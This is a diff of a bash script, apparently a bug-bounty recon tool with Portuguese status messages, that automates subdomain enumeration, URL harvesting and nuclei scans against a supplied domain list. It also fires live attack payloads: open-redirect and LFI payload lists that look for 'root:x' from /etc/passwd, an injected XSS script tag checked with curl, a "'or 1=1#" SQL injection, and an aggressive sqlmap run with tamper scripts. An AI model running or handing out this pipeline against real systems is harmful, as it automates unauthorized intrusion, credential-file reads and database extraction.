@@ -1,7 +1,7 @@
 #!/bin/bash
 
 ############################################subdomain enumaration########################################################
-echo "Iniciando full recon GOOGLE" | notify;
+echo "Iniciando full recon " | notify;
 for i in $(cat $1); do
 	shuffledns -d $i -w /root/lists/subrecon.txt -r /root/lists/dns-resolvers.txt -o subsshuffledns;
 	assetfinder -subs-only $i | anew subsasset;
@@ -20,7 +20,7 @@ for i in $(cat $1); do
 	cat subs* | anew tudo;
 	rm -rf subs* tmp;
 done
-echo "Ta acabando recon... amass e jsub GOOGLE" | notify;
+echo "Ta acabando recon... amass e jsub " | notify;
 amass enum -df $1 -active -p 443,8080,80,81,8081,8443 -config /root/.config/amass/config.ini -o subsamass;
 cat subsamass tudo | anew tot;
 jsubfinder -f tot | anew j200;
@@ -30,11 +30,11 @@ rm tudo subsamass j200 tot;
 ########################################################################################################################
 #############################################validando subdominios######################################################
 
-echo "Validando subdominios GOOGLE" | notify;
+echo "Validando subdominios " | notify;
 cat total | httpx -threads 200 -random-agent -o 200;
 cat 200 | anew total200; rm 200;
 cat total200 | sed 's/$/\//' | anew total200Barra;
-cat total | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -p https:10000 -p http:9000 -p https:9443 -c 50 | anew totalhttprobe;
+cat total | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -p https:10000 -p http:9000 -p https:9443 -c 50 | anew total200;
 
 ########################################################################################################################
 #############################################subdomain takeover#########################################################
@@ -53,28 +53,28 @@ cat vulnerable-cors.txt | notify;
 ########################################################################################################################
 ##############################################collecting urls###########################################################
 
-echo "Colentando urls GOOGLE" | notify;
+echo "Colentando urls " | notify;
 cat total200 | waybackurls | anew wayback;
 cat total200 | gauplus -t 100 --random-agent -b jpg,png,svg,jpeg,gif| anew gaup;
-xargs -a $1 -I@ sh -c 'python3 /root/tools/ParamSpider/paramspider.py -d @ --exclude jpg,png,svg,jpeg,gif --output param';
-cat wayback gaup param| anew urls;
-rm wayback gaup param;
+xargs -a $1 -I@ bash -c 'python3 /root/tools/ParamSpider/paramspider.py -d @ --exclude jpg,png,svg,jpeg,gif --output param';
+cat wayback gaup output/param | anew urls;
+rm -rf wayback gaup output;
 
-echo "Validando URLS GOOGLE" | notify;
+echo "Validando URLS " | notify;
 cat urls | httpx -threads 200 -random-agent -o url200;
 rm urls;
 
 ########################################################################################################################
 ##################################################nuclei#################################################################
 
-echo "Iniciando nuclei, bonitao GOOGLE" | notify;
+echo "Iniciando nuclei, bonitao " | notify;
 nuclei -l total200 -t /root/tools/BugBountyTools/nuclei-template/ -severity low,medium,high,severe,critical -o nuclei | notify;
-echo "Acabou o nuclei GOOGLE" | notify;
+echo "Acabou o nuclei " | notify;
 
 ########################################################################################################################
 #################################################js files analyze#######################################################
 
-#echo "analisando js GOOGLE" | notify;
+#echo "analisando js " | notify;
 #cat total200 | getJS --complete --resolve --output getjs;
 #cat url200 | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' | anew urlsJS.txt;
 #cat total200 | subjs | anew subsjs;
@@ -92,6 +92,9 @@ echo "Acabou o nuclei GOOGLE" | notify;
 
 echo "searching for Open Redirect" | notify;
 cat url200 | gf redirect | anew redirect;
+/root/tools/BugBountyTools/search-qsreplace.sh redirect "This domain is for use in illustrative examples in documents." /root/tools/BugBountyTools/payloads/openpayloads.txt redir;
+/root/tools/BugBountyTools/search-path.sh total200 "This domain is for use in illustrative examples in documents." /root/tools/BugBountyTools/payloads/openpayloads.txt redir;
+
 #python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-param.py opr redirect /root/tools/BugBountyTools/payloads/openpayloads.txt | anew openRedirect_results.txt | notify;
 #python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-url.py opr total200Barra /root/tools/BugBountyTools/payloads/openpayloads.txt | anew openRedirect_results.txt | notify;
 #mkdir openScan; mv redirect sqliScan/; mv openRedirect_results.txt openScan/;
@@ -101,12 +104,11 @@ cat url200 | gf redirect | anew redirect;
 
 echo "searching for XSS vulnearbilities" | notify;
 cat url200 | gf xss | anew xss;
-cat xss | qsreplace "javascript:alert" | anew redi-xss;
-cat redirect | qsreplace "javascript:alert" | anew redi-xss;
-for i in $(cat redi-xss); do
-	python3 /root/tools/BugBountyTools/request-word-finder.py "$i" "javascript:alert" | notify;
-done
-#python3 /root/tools/BugBountyTools/XSS/xss.py xss /root/tools/BugBountyTools/payloads/xsspayloads;
+cat xss | gf xss | grep "source=" | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl -s --path-as-is -k "$host" | grep -qs "<script>confirm(1)" && echo "$host 33[0;31mVulnerablen";done >> xss_results.txt; cat xss_results.txt | notify;
+#into redirection
+echo "javascript:alert(%271%27)" > xr;
+/root/tools/BugBountyTools/search-qsreplace.sh redirect "javascript:alert" xr xss-red;
+
 #gospider -S total200 -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
 
 #########################################################################################################################
@@ -117,24 +119,28 @@ cat url200 | gf ssrf | anew ssrf;
 mkdir ssrfScan; mv ssrf ssrfScan/;
 
 #########################################################################################################################
-###############################################searching for sqli########################################################
-
-echo "Iniciando procura por SQLinjection GOOGLE" | notify;
-cat url200 | gf sqli | anew sqli;
-cat sqli | qsreplace "'or 1=1#" | anew sqli_results.txt;
-cat sqli_results.txt | httpx -threads 200 -random-agent -mc 200 -o sqli200 | notify;
-mkdir sqliScan; mv sqli_results.txt sqliScan/; mv sqli sqliScan/; mv sqli200 sqliScan/;
-
-#########################################################################################################################
 ########################################################### lfi#########################################################
 
 echo "searching for LFI" | notify;
-#cat url200 | gf lfi | anew lfi;
+cat url200 | gf lfi | anew lfi;
+/root/tools/BugBountyTools/search-qsreplace.sh redirect "root:x" /root/tools/BugBountyTools/payloads/lfipayload.txt lfi;
+/root/tools/BugBountyTools/search-path.sh total200 "root:x" /root/tools/BugBountyTools/payloads/lfipayload.txt lfi;
+
 #python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-url.py "lfi" lfi /root/tools/BugBountyTools/payloads/lfipayload.txt | anew lfi_results.txt | notify;
 #python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-url.py "lfi" total200Barra /root/tools/BugBountyTools/payloads/lfipayload.txt | anew lfi_results.txt | nortify;
 #mkdir lfiScan; mv lfi_results.txt lfiScan/; mv lfi lfiScan/;
 
 #########################################################################################################################
+###############################################searching for sqli########################################################
 
-echo "TOOL FINALIZADA! GOOGLE" | notify;
+echo "Iniciando procura por SQLinjection " | notify;
+cat url200 | gf sqli | anew sqli;
+cat sqli | qsreplace "'or 1=1#" | anew sqli_results.txt;
+cat sqli_results.txt | httpx -threads 200 -random-agent -mc 200 -o sqli200 | notify;
+sqlmap -m sqli200 --time-sec=15 --random-agent --level 5 --risk 3 --tamper=space2comment,between --current-db --batch --no-cast;
+#mkdir sqliScan; mv sqli_results.txt sqliScan/; mv sqli sqliScan/; mv sqli200 sqliScan/;
+
+#########################################################################################################################
+
+echo "TOOL FINALIZADA! " | notify;
 
